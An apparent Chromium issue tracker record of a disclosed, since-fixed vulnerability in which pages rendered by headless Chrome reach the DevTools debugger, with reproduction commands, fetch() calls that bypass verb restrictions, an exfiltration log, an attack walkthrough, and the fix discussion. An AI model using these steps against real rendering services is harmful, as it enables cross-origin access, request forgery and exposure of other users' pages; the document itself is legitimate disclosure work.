# Security: Escape the page sandbox to the Chromium debugger via Chrome headless snapshots

| Field | Value |
|-------|-------|
| **Issue ID** | [40061801](https://issues.chromium.org/issues/40061801) |
| **Status** | Accepted |
| **Severity** | S3-Low |
| **Priority** | P3 |
| **Component** | Internals>Headless, Platform>DevTools |
| **Platforms** | Linux, Mac, Windows |
| **Reporter** | zs...@canva.com |
| **Assignee** | al...@chromium.org |
| **Created** | 2022-11-18 |
| **Bounty** | $2,000.00 |

## Description

**VULNERABILITY DETAILS**  

As you're well aware headless Chromium is widely used to convert websites to images and PDFs, this functionality can be found in numerous cloud services that render user-provided pages and return an image version. Projects like <https://github.com/puppeteer/puppeteer> launch in a configuration by default that is vulnerable to the below issue.

From our research we've found that Chrome is used in these cases via:

\* Starting Chrome headlessly: --headless  

\* Exposing the debug port so the launching process can control Chrome on loopback without launching Chrome per screenshot/PDF export, e.g. --remote-debugging-port=9222

In order to Connect to the debug port a "target ID" is required. This target ID is printed by Chrome onto stdout, e.g.:

DevTools listening on ws://127.0.0.1:9222/devtools/browser/94ddc66f-fb4d-4456-93c4-b9c2281bbd39

The target ID serves as a type of authentication token that prevents pages from connecting to the debug websocket.

Due to several endpoints in the Chrome DevTools protocol it's possible for pages rendered within Chrome (as per the use-cases above, e.g. for converting HTML to images or PDFs) to obtain this target ID and connect to to the Chrome debugger. This allows:

\* CORS bypasses via methods like Runtime.evaluate  

\* Proxy bypasses (if setup) via Target.createBrowserContext  

\* Accessing other pages/tabs in the browser via Target.getTargets

**VERSION**  

Chrome Version: 107.0.5304.110 + stable  

Operating System: macOS 12.6.1 (M1) (also tested on Ubuntu 20.x x86)

**REPRODUCTION CASE**

Note that Chrome is launched with a fixed remote debugging port to make the PoC easier. We have a method for effectively finding the port (within 30s for the full 1-65535 range) which we can share if required.

To reproduce and simulate a cloud service using Chrome to convert an arbitrary webpage to an image:

1. Save `index.html` and `persist.html` locally
2. Serve them up on HTTP 5959, e.g. python3 -m http.server 5959
3. Launch Chrome headlessly and with a debugging port enabled (on loopback, this issue is unrelated to "remote" access)

/Applications/Google\ Chrome.app/Contents/MacOS/Google\ Chrome \  

--remote-debugging-port=9222 \  

--user-data-dir=chrome-profile \  

--no-first-run \  

--headless \  

<http://localhost:5959/index.html>

DevTools listening on ws://127.0.0.1:9222/devtools/browser/659f2867-0338-4cb0-8dea-96a1b26bc5cd

4. Export the loaded page as a screenshot. This simulates the way Chrome is used server-side in many services:

Using <https://github.com/vi/websocat> for example:

$ echo '{"id":1, "method":"Target.getTargets"}' | websocat -n1 ws://127.0.0.1:9222/devtools/browser/659f2867-0338-4cb0-8dea-96a1b26bc5cd

{"id":1,"result":{"targetInfos":[{"targetId":"D868419574E9EC5AD570BA4C301FA972","type":"page","title":"localhost:5959/persist.html","url":"http://localhost:5959/persist.html","attached":false,"canAccessOpener":false,"browserContextId":"3B1DA4A3D6955F3F0B73FC01A8D6C293"},{"targetId":"47519BDF096DC4C0273FDB56AC170D6E","type":"page","title":"localhost:5959/index.html","url":"http://localhost:5959/index.html","attached":false,"canAccessOpener":false,"browserContextId":"3B1DA4A3D6955F3F0B73FC01A8D6C293"}]}}

Then screenshot the "index.html" target simulating an export from a page to an image:

$ echo '{"id":1, "method":"Page.captureScreenshot"}' | websocat -n1 -B 100000 ws://127.0.0.1:9222/devtools/page/47519BDF096DC4C0273FDB56AC170D6E | jq -r '.result.data' | base64 --decode > screenshot.png

(See screenshot.png)

5. Update persist.html (line 14) with the browser ID from the screenshot (659f2867-0338-4cb0-8dea-96a1b26bc5cd)
6. Note HTTP 5959 is called with the browser process info, demonstrating escaping from the page into the debugger

::1 - - [18/Nov/2022 15:06:10] "GET /persist.html HTTP/1.1" 200 -  

::1 - - [18/Nov/2022 15:06:10] "GET /?o=%7B%22id%22%3A1%2C%22result%22%3A%7B%22processInfo%22%3A%5B%7B%22type%22%3A%22browser%22%2C%22id%22%3A45761%2C%22cpuTime%22%3A0.936511%7D%2C%7B%22type%22%3A%22renderer%22%2C%22id%22%3A45771%2C%22cpuTime%22%3A1.150753%7D%2C%7B%22type%22%3A%22renderer%22%2C%22id%22%3A45767%2C%22cpuTime%22%3A0.070163%7D%2C%7B%22type%22%3A%22GPU%22%2C%22id%22%3A45764%2C%22cpuTime%22%3A0.519738%7D%2C%7B%22type%22%3A%22network.mojom.NetworkService%22%2C%22id%22%3A45766%2C%22cpuTime%22%3A0.277861%7D%5D%7D%7D HTTP/1.1" 200 -

FIXING

From looking into this there's a few ways impact can be reduced by Chrome:

\* Ensuring `/json/version` and related endpoints cannot be iframed (e.g. set a Content-Security-Policy or X-Frame-Options response header)  

\* Ensuring `/json/new` cannot be accessed from Chrome, or more specifically pages within the sandbox. The GET/POST deprecation should help here, but `/json/new` isn't required for this exploit if Chrome isn't relaunched.  

\* More documentation, only the risks of "remote" access to the debug port is discussed in docs. However, the exploit above works over loopback.

**CREDIT INFORMATION**

Reporter credit: Rhys Elsmore and Zac Sims of the Canva security team

## Attachments

- [index.html](attachments/index.html) (text/plain, 381 B)
- [screenshot.png](attachments/screenshot.png) (image/png, 45.0 KB)
- [persist.html](attachments/persist.html) (text/plain, 1007 B)

## Timeline

### [Deleted User] (2022-11-18)

[Empty comment from Monorail migration]

### zs...@canva.com (2022-11-20)

To add some more detail, there's two issues the vulnerability relates to:

 1. /json/new gives a way to open a new tab without the restrictions on window.open. This gives persistence for long lived Chrome instances. Being able to see the "output" of a page isn't required to exploit this.

 2. The ability to get the browser target ID by framing /json/version. This gives a page the ability to bypass CORS, the proxy settings of Chrome, etc. A malicious user must be able to see the output of the page (e.g. PDF, screenshot, etc) to exploit this.

Given Puppeteer is maintained by the DevTools team, it's worth pointing out that it's vulnerable straight out of the box:

import puppeteer from 'puppeteer';

(async () => {
  const browser = await puppeteer.launch({
    headless: false
  });
  console.log(browser.wsEndpoint())
  const page = await browser.newPage();

  await page.goto('https://malicious-page.example.com/');
})();

Starting this gives

$ node index.js               
ws://127.0.0.1:62624/devtools/browser/34b57772-ed99-4899-9096-2b0c8672b61d

So the malicious page only needs to find port 62624 to open a new persistent tab, or frame http://localhost:62624/json/version to find the browser target ID if Puppeteer is being used to screenshot the malicious page. The Puppeteer docs state it's safe for automating malicious pages:

> Security: Puppeteer operates off-process with respect to Chromium, making it safe to automate potentially malicious pages.
From https://pptr.dev/faq

On a semi-related note there's seemingly some work to make /json only respect safe verbs, however the code at misses HEAD. So even if POST/GET were deprecated it's still possible for a malicious page to open tabs:

Using GET/POST gives:
[1121/093650.263663:ERROR:devtools_http_handler.cc(636)] Using unsafe HTTP verb GET to invoke /json/new. This action will stop supporting GET and POST verbs in future versions.

Which can be bypassed with:
fetch('http://localhost:9222/json/new?http%3A%2F%2Flocalhost%3A5959%2fpersist.html', { method: 'HEAD', mode: 'no-cors' })

Given HEAD is one of the other no-cors safe verbs.

### dr...@chromium.org (2022-11-21)

This all reproduces as claimed in M107. The /json/new problem vulnerability sounds reasonable to me. I'm kind of skeptical about the /json/version vulnerability, since I can't think of any server-side crawling context where a site would be able to see itself in a renderered screenshot. But the CSP changes sound straightforward, so they may still be worth doing, for defense in depth?

Adding security labels and triaging to some headless owners. skyostil@, caseq@ - can you take a look?

[Monorail components: Internals>Headless]

### [Deleted User] (2022-11-21)

[Empty comment from Monorail migration]

### [Deleted User] (2022-11-21)

Setting Pri-2 to match security severity Low. If this is incorrect, please reset the priority. Sheriffbot won't make this change again.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### zs...@canva.com (2022-11-21)

> I'm kind of skeptical about the /json/version vulnerability, since I can't think of any server-side crawling context where a site would be able to see itself in a renderered screenshot

The site doesn't need to see its own screenshot, but rather the malicious user needs a way to see the output. This a pretty common setup for HTML export in various SaaS tools, or in the the numerous "screenshot this URL" sites (several in https://github.com/transitive-bullshit/awesome-puppeteer#services for example).

Exploitation looks like:

 1. Create a malicious page to export/screenshot, e.g. http://malicious.example.com
 2. Ask a SaaS service (e.g. CMS, Wiki, URL to Screenshot tool, Remote browser testing service) to screenshot the page
 3. The page pops persist.html via /json/new
 4. The page returns /json/version in an iframe revealing the browser target ID (per the screenshot)
 5. The attacker essentially has a C2 in Chrome (persist.html) to connect to the websocket URL know they know the target ID from step 4.

If Chromium is re-used between exports/screenshots it's possible to access other screenshots being run in the same Chromium instance. At the very least once you're in the debugger the malicious page can bypass CORS (useful for server side request forgery, or local file include) and drop things like the Chromium proxy settings.

Some setups also launch Chromium once per export, but we've found it's possible to connect to other Chromium instances to run the exploit all the same. Noting this is with the default Puppeteer configuration - so the issue is very widespread.

### sk...@chromium.org (2022-11-22)

Thanks for the report. In general, we probably want to nudge folks toward `--remote-debugging-socket` instead of `--remote-debugging-port`, but meanwhile adding CSP on `/json` and making sure `HEAD` is also disallowed sounds good to me.

Caseq, did you want to take this over? I can take a look too, but you'd probably get a fix together quicker :)

### zs...@canva.com (2022-11-22)

Thanks for taking a look at this, most appreciated. We've been researching this since discovering and have found multiple vulnerable services. This issue seems /very/ wide-spread, and the security impact can be quite severe.

> we probably want to nudge folks toward `--remote-debugging-socket` instead of `--remote-debugging-port`

Ideally also in Puppeteer by default? As many instances we've seen are just using the default Puppeteer config which uses a random port.

>  and making sure `HEAD` is also disallowed sounds good to me.
An update - it seems every verb is permitted, even OPTIONS. So this also works due to the OPTIONS preflight:

fetch('http://localhost:9222/json/new?http%3A%2F%2Flocalhost%3A5959%2fpersist.html', { method: 'POST', mode: 'cors' })

>  but meanwhile adding CSP on `/json`

There's really two distinct issues:
 1. /json/new to pop a new page, which the verb changes should help.
 2. Getting the contents of /json/* (browser or page target IDs)

Getting contents of the /json/... endpoint is possible via framing, which CSP will help mitigate. But it's also possible to get the content by using that as the initial page, e.g. instead of http://malicious.example.com request a screenshot for http://localhost:9222/json/version, or redirect the page on first load (e.g. window.location = "http://localhost:9222/json/version") which CSP will not help mitigate.

### [Deleted User] (2022-11-23)

[Empty comment from Monorail migration]

### sk...@chromium.org (2022-11-28)

+dsv@ since it looks like there's some ongoing work here as a part of https://crbug.com/chromium/813542. Can we go ahead with disallowing GET/POST for /json/new now?

### zs...@canva.com (2022-11-29)

From some research this seems to impact numerous services. Happy to jump on a Google Meet and discuss, but wanted to highlight this issue is rather widespread.

### sk...@chromium.org (2022-11-29)

Partial fix here: https://chromium-review.googlesource.com/c/chromium/src/+/4060376

Caseq, maybe your team is in a better position to figure out how to handle this in Puppeteer etc?


### ds...@chromium.org (2022-11-29)

cc Alex for Puppeteer

### al...@chromium.org (2022-11-29)

> Getting contents of the /json/... endpoint is possible via framing, which CSP will help mitigate. But it's also possible to get the content by using that as the initial page, e.g. instead of http://malicious.example.com request a screenshot for http://localhost:9222/json/version, or redirect the page on first load (e.g. window.location = "http://localhost:9222/json/version") which CSP will not help mitigate.

The screenshot has to be requested from the Puppeteer, right (the page cannot do it)? and if the page redirects via `window.location = "http://localhost:9222/json/version"`, it won't be able to execute any code to actually use the the target and page IDs to establish a CDP session.

### zs...@canva.com (2022-11-29)

> The screenshot has to be requested from the Puppeteer, right (the page cannot do it)? and if the page redirects via `window.location = "http://localhost:9222/json/version"`, it won't be able to execute any code to actually use the the target and page IDs to establish a CDP session.

Correct. The screenshot would have to be via Puppeteer (ignoring the "disable web security" usages of Chromium). This is a pretty common setup for "screenshot this URL" or "export this HTML" as PDF usages of Chromium. If the Chromium instance is long lived (which we've found is fairly common, presumably due to the overhead of re-launching) the browser target ID remains fixed. So in that case:

 1. "Screenshot" or PDF export (depending on how Chromium is used) http://localhost:9222/json/version
 2. "Screenshot" a malicious page using the browser target ID obtained in step 1

### [Deleted User] (2022-11-29)

[Empty comment from Monorail migration]

### gi...@appspot.gserviceaccount.com (2022-11-30)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src/+/5606dfdcb917db69b08628ad6b01b982a121972e

commit 5606dfdcb917db69b08628ad6b01b982a121972e
Author: Sami Kyostila <skyostil@chromium.org>
Date: Wed Nov 30 02:47:01 2022

devtools: Disallow loading /json endpoints in frames

Bug: 1385982
Change-Id: Ic8f81de52a28d4a17a480d59a6b233147f687bb9
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/4060376
Reviewed-by: Andrey Kosyakov <caseq@chromium.org>
Auto-Submit: Sami Kyöstilä <skyostil@chromium.org>
Commit-Queue: Sami Kyöstilä <skyostil@chromium.org>
Commit-Queue: Andrey Kosyakov <caseq@chromium.org>
Cr-Commit-Position: refs/heads/main@{#1077237}

[modify] https://crrev.com/5606dfdcb917db69b08628ad6b01b982a121972e/content/browser/devtools/devtools_http_handler.cc
[modify] https://crrev.com/5606dfdcb917db69b08628ad6b01b982a121972e/headless/test/headless_web_contents_browsertest.cc


### sk...@chromium.org (2022-12-01)

dsv@, let me hand this off to you for the GET/POST deprecation part now that iframing has been prevented.

### sa...@chromium.org (2022-12-01)

[Empty comment from Monorail migration]

### zs...@canva.com (2022-12-06)

CSP will help where the page is framed, but there's still cases where it's possible to load `/json/* ` not in a frame. E.g.:

 * Redirect the page to `http://localhost:<port>/json/version` to get the target ID; or
 * "Screenshot" http://localhost:<port>/json/version directly - this is a vector for the numerous "screenshot a URL" style services

Are there mitigations that can be applied in this case? Moving to sockets with Puppeteer will help to some degree, as would black-holing localhost traffic from Chromium, e.g. --proxy-bypass-list="<-loopback>" + proxy settings

From researching this, I wanted to again highlight how many services are vulnerable to this - especially as many of them maintain long-running Chromium instances due to the startup time, meaning the target ID for the browser remains constant.

To ensure the larger community is protected and in line with the 90+30 day disclosure policy, we're planning to disclose the issue on March 18 2023.

### al...@chromium.org (2022-12-07)

Puppeteer users can also choose to use pipes (`--remote-debugging-pipe`) in which case there is no HTTP/websocket server.

### zs...@canva.com (2022-12-08)

> Puppeteer users can also choose to use pipes (`--remote-debugging-pipe`) in which case there is no HTTP/websocket server.

Can this become the default? It'd help with the default setup (https://github.com/puppeteer/puppeteer/blob/931d4fced52aefbefdc8b21edfe3d1528e4e448b/examples/screenshot.js#L1) is vulnerable to this issue straight out of the box if the attacker controls part of the page and has access to the screenshot.

### al...@chromium.org (2022-12-09)

I have opened a PR to see if we can switch it on by default. But as I understand restricting verbs to allow only PUT requests would also prevent the issue?

### zs...@canva.com (2022-12-14)

Thanks! Yeah PUT should work given it'll need CORS. The host/IP validation is already implemented (can't talk on anything but localhost or 127.0.0.1 and variants of) which stops DNS rebinding attacks (e.g. CORS on attacker domain, then request to vulnerable localhost)

### al...@chromium.org (2022-12-14)

So I tried to repro this issue using Puppeteer and succeeded. But it looks like enabling pipes by default would not be the right solution here because Puppeteer supports also Firefox and Firefox does not support pipes. Instead, Firefox checks for the Origin header of the socket requests (https://searchfox.org/mozilla-central/source/remote/server/WebSocketHandshake.sys.mjs#135) and only allows requests that don't come from the browser or that conform to an allowlist provided via CLI. It appears that the following would be an appropriate solution:

1) Handle HTTP verbs properly: e.g., GET for reading data, PUT for modifying data. Keeping GET for /json/version would be generally backwards-compatible. 
2) Check the Origin header of the incoming web socket connections. Reject anything that has an Origin header.
3) Allow allow-listing origins via CLI.

This way even if someone guesses or learns about target IDs or websocket URLs in any way, they will not be able to exploit it. WDYT?


### zs...@canva.com (2022-12-14)

We're still trying to verify if Firefox is vulnerable, but still haven't been able to get a PoC. As you say Firefox have the origin check + host check, where Chromium currently only has the host check.

I think that's a solid plan, and covers the exploitation paths we're aware of:

 * DNS rebinding is covered by the host check
 * Origin check for anything coming from a browser, including rejecting null origins, requests from other Chromium instances, etc
 * Most usages outside browsers (Puppeteer, custom drivers, etc) aren't likely going to be sending an Origin header anyway

### al...@chromium.org (2022-12-15)

I have tried implementing the Origin based restrictions (will still work on a CLI override). I confirmed that it works and one no longer can connect to the browser from the page. 
What I found is that the Catapult telemetry is using a python websocket client that unnecessarily sends an Origin header. So adding those restrictions would break telemetry tests. I am gonna see if I can remove the Origin header from the telemetry client.

### gi...@appspot.gserviceaccount.com (2022-12-15)

The following revision refers to this bug:
  https://chromium.googlesource.com/catapult/+/bf0782db65682f3918886ba69807c03fe515c2e8

commit bf0782db65682f3918886ba69807c03fe515c2e8
Author: Alex Rudenko <alexrudenko@chromium.org>
Date: Wed Dec 14 21:40:18 2022

Telemetry client should not set origin

The origin header is a forbidden header name[1] which means that generally it should not be up to the user to decide upon it. The origin header might be used by the server to enforce cross-origin policies and
non-browser clients should not need it in general.

I realise that this is a third party library but I see that it was not updated for 5 years and there were changes made to it. So is it a work at this point? The newer version comes with an option to suppress sending the origin header so we can either remove it in this version
or use the option if the library can be updated.

[1]: https://developer.mozilla.org/en-US/docs/Glossary/Forbidden_header_name

Bug: chromium:1385982
Change-Id: I591392e2cb0de1e722f98e3611b765be47667c8e
Reviewed-on: https://chromium-review.googlesource.com/c/catapult/+/4109148
Reviewed-by: Mikhail Khokhlov <khokhlov@google.com>
Commit-Queue: Alex Rudenko <alexrudenko@chromium.org>

[modify] https://crrev.com/bf0782db65682f3918886ba69807c03fe515c2e8/telemetry/third_party/websocket-client/websocket/_handshake.py


### gi...@appspot.gserviceaccount.com (2022-12-15)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src/+/f8f4b584b7217df30723775453591a5d4e3e751e

commit f8f4b584b7217df30723775453591a5d4e3e751e
Author: chromium-autoroll <chromium-autoroll@skia-public.iam.gserviceaccount.com>
Date: Thu Dec 15 11:41:17 2022

Roll Catapult from 0d416fe68a0e to bf0782db6568 (1 revision)

https://chromium.googlesource.com/catapult.git/+log/0d416fe68a0e..bf0782db6568

2022-12-15 alexrudenko@chromium.org Telemetry client should not set origin

If this roll has caused a breakage, revert this CL and stop the roller
using the controls here:
https://autoroll.skia.org/r/catapult-autoroll
Please CC seanmccullough@google.com,wenbinzhang@google.com on the revert to ensure that a human
is aware of the problem.

To file a bug in Chromium: https://bugs.chromium.org/p/chromium/issues/entry

To report a problem with the AutoRoller itself, please file a bug:
https://bugs.chromium.org/p/skia/issues/entry?template=Autoroller+Bug

Documentation for the AutoRoller is here:
https://skia.googlesource.com/buildbot/+doc/main/autoroll/README.md

Cq-Include-Trybots: luci.chromium.try:android_optional_gpu_tests_rel;luci.chromium.try:linux_optional_gpu_tests_rel;luci.chromium.try:mac_optional_gpu_tests_rel;luci.chromium.try:win_optional_gpu_tests_rel
Bug: chromium:1385982
Tbr: seanmccullough@google.com,wenbinzhang@google.com
Change-Id: I9d695044c5627fe6da5a69479600d2e5120a5f5e
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/4110034
Bot-Commit: chromium-autoroll <chromium-autoroll@skia-public.iam.gserviceaccount.com>
Commit-Queue: chromium-autoroll <chromium-autoroll@skia-public.iam.gserviceaccount.com>
Cr-Commit-Position: refs/heads/main@{#1083675}

[modify] https://crrev.com/f8f4b584b7217df30723775453591a5d4e3e751e/DEPS


### ca...@chromium.org (2022-12-16)

[Empty comment from Monorail migration]

### gi...@appspot.gserviceaccount.com (2022-12-19)

The following revision refers to this bug:
  https://chromium.googlesource.com/devtools/devtools-frontend/+/9a4bda39f522599b5f1146167061633d2d2ac2ed

commit 9a4bda39f522599b5f1146167061633d2d2ac2ed
Author: Alex Rudenko <alexrudenko@chromium.org>
Date: Fri Dec 16 11:38:09 2022

Configure --remote-allow-origins

The flag is added in https://crrev.com/c/4106102

Bug: chromium:1385982
Change-Id: Id8b2bb21bac4b6a5962092d27feff2cea7e3ccb0
Reviewed-on: https://chromium-review.googlesource.com/c/devtools/devtools-frontend/+/4112007
Reviewed-by: Danil Somsikov <dsv@chromium.org>
Commit-Queue: Alex Rudenko <alexrudenko@chromium.org>

[modify] https://crrev.com/9a4bda39f522599b5f1146167061633d2d2ac2ed/test/conductor/hooks.ts
[modify] https://crrev.com/9a4bda39f522599b5f1146167061633d2d2ac2ed/test/unittests/karma.conf.js


### ds...@chromium.org (2022-12-19)

[Empty comment from Monorail migration]

### gi...@appspot.gserviceaccount.com (2022-12-21)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src/+/0154caeefc74530d5cb57ce71608beb1b77bca39

commit 0154caeefc74530d5cb57ce71608beb1b77bca39
Author: Alex Rudenko <alexrudenko@chromium.org>
Date: Wed Dec 21 07:54:07 2022

DevTools: reject debugging web socket connections with a defined Origin header

Unless the browser is started with a new flag `--remote-allow-origins=<origin>[,<origin>, ...]`. The star origin `*` allows all origins.
This CL should not affect non-browser clients such as Puppeteer and WebDriver. It affects DevTools e2e tests in the hosted mode which is fixed in [1]. It should not affect features like remote debugging that
don't use web sockets.

[1]: https://crrev.com/c/4112007

Bug: chromium:1385982
Change-Id: I721f7db3167ebab63416c8a1f48281735f063e48
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/4106102
Reviewed-by: Dmitry Gozman <dgozman@chromium.org>
Commit-Queue: Alex Rudenko <alexrudenko@chromium.org>
Reviewed-by: Andrey Kosyakov <caseq@chromium.org>
Reviewed-by: Danil Somsikov <dsv@chromium.org>
Cr-Commit-Position: refs/heads/main@{#1085812}

[modify] https://crrev.com/0154caeefc74530d5cb57ce71608beb1b77bca39/content/public/common/content_switches.h
[modify] https://crrev.com/0154caeefc74530d5cb57ce71608beb1b77bca39/content/public/common/content_switches.cc
[modify] https://crrev.com/0154caeefc74530d5cb57ce71608beb1b77bca39/content/browser/devtools/devtools_http_handler.cc
[modify] https://crrev.com/0154caeefc74530d5cb57ce71608beb1b77bca39/content/browser/devtools/devtools_http_handler_unittest.cc
[modify] https://crrev.com/0154caeefc74530d5cb57ce71608beb1b77bca39/content/browser/devtools/devtools_http_handler.h


### al...@chromium.org (2022-12-21)

So this issue can be considered fixed I believe. To summarise:

1) Loading of json endpoints into iframes has been disabled.
2) `json/new` HTTP verbs have been restricted to PUT.
3) Connections with an origin header have been disallowed.

So even if the page somehow learns/guess the websocket URL, they will not be able to connect to it from within the page.

### zs...@canva.com (2022-12-21)

Fantastic! Thanks so much for fixing this so exhaustively.

Will there be a CVE for this (+ when is scheduled disclosure)? It will greatly help us reference this + chase remediation.

### al...@chromium.org (2022-12-21)

I am not sure about the process for security bugs here. dsv@ or someone from security, could you please advice? 

### ds...@chromium.org (2022-12-21)

Yes, iy all should be handled semi-automatically.

[Monorail components: Platform>DevTools]

### gi...@appspot.gserviceaccount.com (2022-12-22)

The following revision refers to this bug:
  

commit 4100bf4b4a4b3fc6b89640ef08cd8e27d44d0415
Author: Alex Rudenko <alexrudenko@google.com>
Date: Thu Dec 22 07:15:41 2022


### gi...@appspot.gserviceaccount.com (2022-12-22)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src/+/18066aed4ce137ef2ab4e4b7af2a8a00980770ab

commit 18066aed4ce137ef2ab4e4b7af2a8a00980770ab
Author: chromium-internal-autoroll <chromium-internal-autoroll@skia-corp.google.com.iam.gserviceaccount.com>
Date: Thu Dec 22 10:37:49 2022

Roll devtools-internal from a2ee49cc949a to 4100bf4b4a4b (2 revisions)

https://chrome-internal.googlesource.com/devtools/devtools-internal.git/+log/a2ee49cc949a..4100bf4b4a4b

If this roll has caused a breakage, revert this CL and stop the roller
using the controls here:
https://skia-autoroll.corp.goog/r/devtools-internal-chromium
Please CC devtools-waterfall-sheriff-onduty@grotations.appspotmail.com on the revert to ensure that a human
is aware of the problem.

To report a problem with the AutoRoller itself, please file a bug:
https://bugs.chromium.org/p/skia/issues/entry?template=Autoroller+Bug

Documentation for the AutoRoller is here:
https://skia.googlesource.com/buildbot/+doc/main/autoroll/README.md

Cq-Include-Trybots: luci.chrome.try:linux-chromeos-chrome
Bug: chromium:1385982
Tbr: devtools-waterfall-sheriff-onduty@grotations.appspotmail.com
Change-Id: I9ff87e58797581d0a74c120962c073fb5204b8ac
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/4122083
Bot-Commit: chromium-internal-autoroll <chromium-internal-autoroll@skia-corp.google.com.iam.gserviceaccount.com>
Commit-Queue: chromium-internal-autoroll <chromium-internal-autoroll@skia-corp.google.com.iam.gserviceaccount.com>
Cr-Commit-Position: refs/heads/main@{#1086250}

[modify] https://crrev.com/18066aed4ce137ef2ab4e4b7af2a8a00980770ab/DEPS


### [Deleted User] (2022-12-22)

[Empty comment from Monorail migration]

### [Deleted User] (2022-12-22)

[Empty comment from Monorail migration]

### am...@chromium.org (2023-01-03)

Hello!  re:comments #35 and #36: 
>>>Will there be a CVE for this (+ when is scheduled disclosure)? It will greatly help us reference this + chase remediation.
A CVE will be issued for this bug, directly on this report, when the fix ships in a Stable channel release. 
This is a fix for a low severity issue, so it is not backmerged. It was landed on M111, the release date of which is 7 March 2023. 

This issue was updated as Fixed on 21 December and, as with most security bugs, will automatically be publicly disclosed 14 weeks after fix - so on 29 March 2023 if my math is correct. 

In the meantime, since fixed, this issue has been disclosed to the security-notify community (see label Retrict-View-SecurityNotify) so downstream Chromium embedders of significantly deployed browsers and software have access to this issue so they can absorb the fix. Hopefully this helps in your remediation-chasing efforts. :) 



### zs...@canva.com (2023-01-04)

Fantastic, thanks for the details Amy.

### al...@chromium.org (2023-01-20)

Do we have any estimate of how many services are affected by this? Is it only the pdf/screenshoting services or some automated testing platforms as well? 

### zs...@canva.com (2023-01-23)

We haven't extensively researched beyond our own usage of Chromium, and some examples in the wild that have a responsible disclosure program that we used to build and confirm our research.

Based on the two issues we found:

Everyone who used long-lived Chromium instances is vulnerable to /json/new launching persistent pages. Regardless of whether the output is reflected.

For the RCE/CORS/SSRF style attack where the browser ID is reflected, we found can appear in export functionality (e.g. export page as PDF), automated testing services, and various URL to screenshot services. I think a key contributing factor is that Puppeteer with the pre-fix version of Chromium is vulnerable out of the box (uses websockets and not pipes) and users are encouraged to keep Chromium running as the performance penalty for launching a new instance per job is significant.

### am...@google.com (2023-01-26)

*** Boilerplate reminders! ***
Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.

Please contact security-vrp@chromium.org with any questions.
******************************

### am...@chromium.org (2023-01-27)

Congratulations Rhys and Zac! The VRP Panel has decided to award you $2,000 for this report. Thank you for your efforts in reporting this issue to us -- nice work! 

### am...@google.com (2023-01-28)

[Empty comment from Monorail migration]

### zs...@canva.com (2023-01-30)

Fantastic! We'd love to donate this to charity (and have it matched :-)). Can we please nominate https://www.givedirectly.org/ ? 

### am...@chromium.org (2023-01-30)

Hi Zac! Thank you for donating your reward, which would be doubled for doing so! We process our donations through the Benevity.org platform. I did see that Give Directly is an organization to which can be donated through Benevity. I can either donate it directly through Benevity for your or send you a code so that you are able to directly. Please let me know your preference and we can get that done for you. 

### zs...@canva.com (2023-01-30)

Amazing. Happy for you to donate directly through Benevity, thanks!

Also if possible can we please have a reference/receipt? So we can get Canva to match the donation also :).


### zs...@canva.com (2023-01-30)

Also happy with the code if it makes getting a reference/receipt easier - whatever works for you. Most appreciated Amy :-)

### am...@chromium.org (2023-02-03)

[Empty comment from Monorail migration]

### pg...@google.com (2023-02-07)

[Empty comment from Monorail migration]

### pg...@google.com (2023-02-07)

[Empty comment from Monorail migration]

### am...@chromium.org (2023-02-13)

Hi Zac and Rhys, I've just sent you an email regarding your request to donate your reward. You should have all the information to do so (with the doubled reward amount) allowing you direct access to donate the reward and provide donation confirmation / receipt to Canva. Happy Giving! :) 

### ya...@google.com (2023-02-14)

[Empty comment from Monorail migration]

### al...@chromium.org (2023-03-10)

[Empty comment from Monorail migration]

### [Deleted User] (2023-03-30)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### is...@google.com (2023-03-30)

This issue was migrated from crbug.com/chromium/1385982?no_tracker_redirect=1

[Auto-CCs applied]
[Multiple monorail components: Internals>Headless, Platform>DevTools]
[Monorail mergedwith: crbug.com/chromium/1415344]
[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40061801)*
